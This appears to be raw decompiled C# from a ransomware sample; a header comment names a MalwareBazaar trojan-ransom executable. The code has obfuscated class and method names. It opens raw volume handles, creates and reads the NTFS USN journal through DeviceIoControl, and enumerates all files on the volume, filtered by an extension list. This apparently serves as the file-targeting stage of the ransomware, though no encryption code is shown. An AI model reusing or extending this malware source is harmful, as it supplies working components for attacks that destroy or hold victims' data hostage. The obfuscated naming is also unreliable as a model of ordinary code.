// Decompiled with JetBrains decompiler
// Type: SyaaQuaZnuVC.LeFVxlMLXOora
// Assembly: Client-0, Version=0.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 3332F4B9-4EB1-4ECC-A637-16FC36F853D6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.03-msil\HEUR-Trojan-Ransom.Win32.Generic-936a35ca214e9be1438c67a1153c854c28054994ce43f1eed39bb9dc52cb54dd.exe

using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;

namespace SyaaQuaZnuVC
{
  public class LeFVxlMLXOora
  {
    public void oBKxowLPqDffn(
      string zOGkvxfPXKSF,
      HashSet<string> bypDrTLZMctdd,
      out Dictionary<ulong, LwrHnVEFYNehp> IomyjRbOTa,
      out Dictionary<ulong, LwrHnVEFYNehp> BSkteNLUiXVfqN)
    {
      BSkteNLUiXVfqN = new Dictionary<ulong, LwrHnVEFYNehp>();
      IomyjRbOTa = new Dictionary<ulong, LwrHnVEFYNehp>();
      IntPtr zero = IntPtr.Zero;
      IntPtr AvHbLEpIqSbM = IntPtr.Zero;
      try
      {
        this.OwWXIolSvW(zOGkvxfPXKSF, BSkteNLUiXVfqN);
        this.KqQivwgosnLt(zOGkvxfPXKSF, out AvHbLEpIqSbM);
        this.qbWXeokFBOMGsUV(AvHbLEpIqSbM);
        this.wmWhwmaXAPHqB(ref zero, AvHbLEpIqSbM);
        this.OnhxKIwcUDmxnHKJ(zero, ref IomyjRbOTa, bypDrTLZMctdd, BSkteNLUiXVfqN, AvHbLEpIqSbM);
      }
      catch (Exception ex)
      {
        Console.WriteLine(ex.Message, (object) ex);
        for (Exception innerException = ex.InnerException; innerException != null; innerException = innerException.InnerException)
          Console.WriteLine(innerException.Message, (object) innerException);
        throw new ApplicationException("Error in EnumerateVolume()", ex);
      }
      finally
      {
        if (AvHbLEpIqSbM.ToInt32() != -1)
          ACynyaxKANG.zCcwcZwNgU(AvHbLEpIqSbM);
        if (zero != IntPtr.Zero)
          Marshal.FreeHGlobal(zero);
      }
    }

    private void OwWXIolSvW([In] string obj0, [In] Dictionary<ulong, LwrHnVEFYNehp> obj1)
    {
      string str = "\\\\.\\" + obj0 + (object) Path.DirectorySeparatorChar;
      IntPtr num = ACynyaxKANG.pUJXPaplhif(str, 0U, 3U, IntPtr.Zero, 3U, 33554432U, IntPtr.Zero);
      if (num.ToInt32() == -1)
        return;
      ACynyaxKANG.gFXESaSNIgB qjACfiCwOUtqaX = new ACynyaxKANG.gFXESaSNIgB();
      if (ACynyaxKANG.RUGmYgxfshl(num, out qjACfiCwOUtqaX))
      {
        ulong key = (ulong) qjACfiCwOUtqaX.nrScwUqkPvZhrK << 32 | (ulong) qjACfiCwOUtqaX.NorsNGuMhonayJFq;
        LwrHnVEFYNehp lwrHnVefyNehp = new LwrHnVEFYNehp(str, 0UL);
        obj1.Add(key, lwrHnVefyNehp);
      }
      ACynyaxKANG.zCcwcZwNgU(num);
    }

    private void KqQivwgosnLt(string cxpyrguHzGI, out IntPtr AvHbLEpIqSbM)
    {
      string str = "\\\\.\\" + cxpyrguHzGI;
      AvHbLEpIqSbM = ACynyaxKANG.pUJXPaplhif(str, 3221225472U, 3U, IntPtr.Zero, 3U, 0U, IntPtr.Zero);
    }

    private void OnhxKIwcUDmxnHKJ(
      [In] IntPtr obj0,
      [In] ref Dictionary<ulong, LwrHnVEFYNehp> obj1,
      [In] HashSet<string> obj2,
      [In] Dictionary<ulong, LwrHnVEFYNehp> obj3,
      [In] IntPtr obj4)
    {
      IntPtr num1 = Marshal.AllocHGlobal(65544);
      ACynyaxKANG.xnFOFkCFLQRnK(num1, 65544);
      uint uGYeVCcnanrl = 0;
      while (ACynyaxKANG.MVGMnZQoKCgto(obj4, 590003U, obj0, sizeof (ACynyaxKANG.fJTIdcOVqQFS), num1, 65544, out uGYeVCcnanrl, IntPtr.Zero))
      {
        IntPtr num2 = new IntPtr(num1.ToInt32() + 8);
        ACynyaxKANG.FHqOuUDnubU fhqOuUdnubU;
        for (; uGYeVCcnanrl > 60U; uGYeVCcnanrl -= fhqOuUdnubU.TUIxTXrhCZEwhGC)
        {
          fhqOuUdnubU = new ACynyaxKANG.FHqOuUDnubU(num2);
          if (((int) fhqOuUdnubU.ZQjkWQUXOubEn & 16) != 0)
          {
            if (obj3.ContainsKey(fhqOuUdnubU.QMGiDtZOpd))
              throw new Exception(string.Format("Duplicate FRN: {0} for {1}", (object) fhqOuUdnubU.QMGiDtZOpd, (object) fhqOuUdnubU.WnqumptOpuqWjJ));
            obj3.Add(fhqOuUdnubU.QMGiDtZOpd, new LwrHnVEFYNehp(fhqOuUdnubU.WnqumptOpuqWjJ, fhqOuUdnubU.wRUEYcpoPDUDML));
          }
          else
          {
            bool flag = true;
            if (obj2 != null)
            {
              string extension = Path.GetExtension(fhqOuUdnubU.WnqumptOpuqWjJ);
              flag = obj2.Contains(extension);
            }
            if (flag)
            {
              if (!obj1.ContainsKey(fhqOuUdnubU.QMGiDtZOpd))
              {
                obj1.Add(fhqOuUdnubU.QMGiDtZOpd, new LwrHnVEFYNehp(fhqOuUdnubU.WnqumptOpuqWjJ, fhqOuUdnubU.wRUEYcpoPDUDML));
              }
              else
              {
                LwrHnVEFYNehp lwrHnVefyNehp = obj1[fhqOuUdnubU.QMGiDtZOpd];
                if (string.Compare(fhqOuUdnubU.WnqumptOpuqWjJ, lwrHnVefyNehp.get_Name(), true) != 0)
                {
                  Console.WriteLine("Attempt to add duplicate file reference number: {0} for file {1}, file from index {2}", (object) fhqOuUdnubU.QMGiDtZOpd, (object) fhqOuUdnubU.WnqumptOpuqWjJ, (object) lwrHnVefyNehp.get_Name());
                  throw new Exception(string.Format("Duplicate FRN: {0} for {1}", (object) fhqOuUdnubU.QMGiDtZOpd, (object) fhqOuUdnubU.WnqumptOpuqWjJ));
                }
              }
            }
          }
          num2 = new IntPtr((long) num2.ToInt32() + (long) fhqOuUdnubU.TUIxTXrhCZEwhGC);
        }
        Marshal.WriteInt64(obj0, Marshal.ReadInt64(num1, 0));
      }
      Marshal.FreeHGlobal(num1);
    }

    private void qbWXeokFBOMGsUV([In] IntPtr obj0)
    {
      ulong num1 = 8388608;
      ulong num2 = 1048576;
      ACynyaxKANG.adccExBvjiko structure;
      structure.GxKkxpUknqoWn = num1;
      structure.qyAPsgAMIfOEHRJ = num2;
      int num3 = Marshal.SizeOf<ACynyaxKANG.adccExBvjiko>(structure);
      IntPtr num4 = Marshal.AllocHGlobal(num3);
      ACynyaxKANG.xnFOFkCFLQRnK(num4, num3);
      Marshal.StructureToPtr<ACynyaxKANG.adccExBvjiko>(structure, num4, true);
      ACynyaxKANG.MVGMnZQoKCgto(obj0, 590055U, num4, num3, IntPtr.Zero, 0, out uint _, IntPtr.Zero);
    }

    private void wmWhwmaXAPHqB([In] ref IntPtr obj0, [In] IntPtr obj1)
    {
      uint VXDfzqLiRE = 0;
      ACynyaxKANG.quVHmTTreMtirFh roJTceYKHgGC = new ACynyaxKANG.quVHmTTreMtirFh();
      if (!ACynyaxKANG.plZvRJkvqaM(obj1, 590068U, IntPtr.Zero, 0, out roJTceYKHgGC, sizeof (ACynyaxKANG.quVHmTTreMtirFh), out VXDfzqLiRE, IntPtr.Zero))
        return;
      ACynyaxKANG.fJTIdcOVqQFS structure;
      structure.NCeaBAEDabVfyT = 0UL;
      structure.ZQFBhskpGj = 0L;
      structure.llDpsSAKiXEd = roJTceYKHgGC.hxtWZKgxpP;
      int cb = Marshal.SizeOf<ACynyaxKANG.fJTIdcOVqQFS>(structure);
      obj0 = Marshal.AllocHGlobal(cb);
      ACynyaxKANG.xnFOFkCFLQRnK(obj0, cb);
      Marshal.StructureToPtr<ACynyaxKANG.fJTIdcOVqQFS>(structure, obj0, true);
    }
  }
}
